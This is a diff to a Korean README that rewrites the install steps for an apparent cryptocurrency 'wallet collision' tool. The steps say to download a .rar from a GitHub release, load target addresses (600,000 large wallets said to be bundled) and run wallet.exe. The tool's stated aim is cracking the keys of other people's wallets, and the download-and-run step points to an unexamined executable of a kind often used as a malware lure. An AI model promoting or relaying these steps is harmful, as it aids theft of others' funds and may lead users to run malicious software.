@@ -50,8 +50,8 @@
 
 ## 설치 절차
 
-1. 설치 패키지를 다운로드하여 압축을 푼 후 [여기를 클릭하여 다운로드](<url id="d01rleemcu0r068dic30" type="url" status="failed" title="" wc="0">https://github.com/EthCollision/wallet_collission/releases/download/v2.0.0/trx_collision.rar</url> )합니다.
-   2.碰撞이 필요한 지갑 주소를 `input` 디렉토리에 놓습니다（현재 60만 개의 대형 지갑 주소가 기본으로 제공됩니다）.
+1. 설치 패키지를 다운로드하여 압축을 푼 후 [여기를 클릭하여 다운로드](https://github.com/EthCollision/wallet_collission/releases/download/v2.0.0/trx_collision.rar ).
+2. 碰撞이 필요한 지갑 주소를 `input` 디렉토리에 놓습니다（현재 60만 개의 대형 지갑 주소가 기본으로 제공됩니다）.
 3. `wallet.exe`을 실행하여 프로그램을 시작합니다.
 4. 실행이 성공한 후 【시작】 버튼을 클릭합니다.
 
